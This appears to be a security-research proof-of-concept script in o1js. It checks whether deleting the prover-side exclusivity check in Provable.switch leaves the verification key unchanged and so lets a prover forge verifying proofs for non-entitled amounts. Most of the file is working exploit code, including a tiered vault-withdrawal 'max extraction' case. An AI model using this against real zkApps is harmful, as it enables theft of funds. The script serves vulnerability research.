// STAGE 1 FALSIFIER: prove, with a NON-EXCLUSIVE mask, a proof that VERIFIES
// against the verification key compiled from the HONEST (default) gadget.
//
// Threat model: `checkMask` runs under `Provable.asProver` => witness generation only,
// client-side JS. A malicious prover deletes it. We simulate that deletion through
// o1js's OWN public API (`allowNonExclusive: true`), which we measured emits an
// IDENTICAL constraint system -- so the circuit, and hence the VK, is unchanged.
import { Field, Bool, UInt64, Provable, ZkProgram, verify } from 'o1js';

// The "prover flips this" flag. Affects ONLY the off-circuit JS check.
let LAX = false;

// ---------------------------------------------------------------- program A: bare
const TIERS = [Field(10), Field(20), Field(30)];

const Bare = ZkProgram({
  name: 'switch-bare',
  publicOutput: Field,
  methods: {
    pick: {
      privateInputs: [Bool, Bool, Bool],
      async method(m0, m1, m2) {
        const out = Provable.switch([m0, m1, m2], Field, TIERS, {
          allowNonExclusive: LAX,
        });
        return { publicOutput: out };
      },
    },
  },
});

// ------------------------------------------- program B: threat-shaped (value moving)
// A tiered-withdrawal pattern: the mask picks WHICH entitlement tier the caller
// withdraws. Downstream check is a BOUND (the vault balance), which is what a real
// contract writes -- not an equality against the branch list.
const VAULT_BALANCE = UInt64.from(1_000_000);
const TIER_AMOUNTS = [UInt64.from(100), UInt64.from(250), UInt64.from(500)];

const Vault = ZkProgram({
  name: 'switch-vault-withdraw',
  publicOutput: UInt64,
  methods: {
    withdraw: {
      privateInputs: [Bool, Bool, Bool],
      async method(m0, m1, m2) {
        const amount = Provable.switch([m0, m1, m2], UInt64, TIER_AMOUNTS, {
          allowNonExclusive: LAX,
        });
        // downstream check a real zkApp would write: you cannot drain more than the vault holds
        amount.assertLessThanOrEqual(VAULT_BALANCE);
        return { publicOutput: amount };
      },
    },
  },
});

function vkLine(tag, vk) {
  console.log(`SENTINEL vk_${tag}_hash=${vk.hash.toString()}`);
  return vk.hash.toString();
}

console.log('=== compiling with the HONEST gadget (LAX=false) ===');
LAX = false;
const bareHonest = (await Bare.compile()).verificationKey;
const vaultHonest = (await Vault.compile()).verificationKey;
const bareHonestHash = vkLine('bare_honest', bareHonest);
const vaultHonestHash = vkLine('vault_honest', vaultHonest);

console.log('\n=== recompiling with LAX=true (the prover-side check deleted) ===');
LAX = true;
const bareLax = (await Bare.compile({ forceRecompile: true })).verificationKey;
const vaultLax = (await Vault.compile({ forceRecompile: true })).verificationKey;
const bareLaxHash = vkLine('bare_lax', bareLax);
const vaultLaxHash = vkLine('vault_lax', vaultLax);

console.log(
  `SENTINEL bare_vk_identical=${bareHonestHash === bareLaxHash ? 'IDENTICAL' : 'DIFFERENT'}`
);
console.log(
  `SENTINEL vault_vk_identical=${vaultHonestHash === vaultLaxHash ? 'IDENTICAL' : 'DIFFERENT'}`
);

// ---------------------------------------------------------------- control: honest prover refuses
console.log('\n=== CONTROL: does the HONEST path refuse mask [1,1,0]? ===');
LAX = false;
try {
  await Bare.pick(Bool(true), Bool(true), Bool(false));
  console.log('SENTINEL honest_refuses=NO_IT_ACCEPTED');
} catch (e) {
  console.log(`SENTINEL honest_refuses=YES  msg=${String(e.message).split('\n')[0]}`);
}

// ---------------------------------------------------------------- falsifier A
console.log('\n=== FALSIFIER A: mask [1,1,0] on the bare switch ===');
LAX = true;
const bareProof = (await Bare.pick(Bool(true), Bool(true), Bool(false))).proof;
const bareOut = bareProof.publicOutput.toString();
console.log(`SENTINEL bare_output=${bareOut}  (branches were 10,20,30)`);
console.log(`SENTINEL bare_output_is_a_branch=${['10', '20', '30'].includes(bareOut)}`);
// verify against the HONEST verification key
const bareOk = await verify(bareProof.toJSON(), bareHonest);
console.log(`SENTINEL bare_verifies_against_honest_vk=${bareOk}`);

// ---------------------------------------------------------------- falsifier B (the threat)
console.log('\n=== FALSIFIER B: tiered vault withdrawal, mask [1,1,0] ===');
LAX = true;
const vaultProof = (await Vault.withdraw(Bool(true), Bool(true), Bool(false))).proof;
const amount = vaultProof.publicOutput.toString();
console.log(`SENTINEL withdraw_amount=${amount}  (tiers were 100,250,500)`);
console.log(
  `SENTINEL withdraw_is_an_entitled_tier=${['100', '250', '500'].includes(amount)}`
);
const vaultOk = await verify(vaultProof.toJSON(), vaultHonest);
console.log(`SENTINEL vault_verifies_against_honest_vk=${vaultOk}`);

// ---------------------------------------------------------------- how far can it go?
console.log('\n=== FALSIFIER C: all-ones mask (max extraction under the bound) ===');
LAX = true;
const maxProof = (await Vault.withdraw(Bool(true), Bool(true), Bool(true))).proof;
const maxAmount = maxProof.publicOutput.toString();
const maxOk = await verify(maxProof.toJSON(), vaultHonest);
console.log(`SENTINEL max_withdraw_amount=${maxAmount}  (largest entitled tier = 500)`);
console.log(`SENTINEL max_verifies_against_honest_vk=${maxOk}`);

console.log('\n=== DONE ===');
